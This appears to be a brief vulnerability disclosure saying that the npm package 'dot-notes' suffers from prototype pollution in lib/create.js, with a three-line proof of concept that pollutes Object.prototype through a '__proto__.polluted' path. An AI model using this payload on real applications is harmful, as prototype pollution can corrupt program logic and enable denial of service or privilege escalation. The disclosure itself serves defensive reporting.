# Description
```dot-notes``` is Simple dot/bracket notation parsing/conversion for JSON. 
This package is vulnerable to prototype pollution through ```dot-notes/lib/create.js```

# Proof-of-Concept
```
const note = require('./lib/create.js');
note({},'__proto__.polluted',true);
console.log(polluted)  \\true
```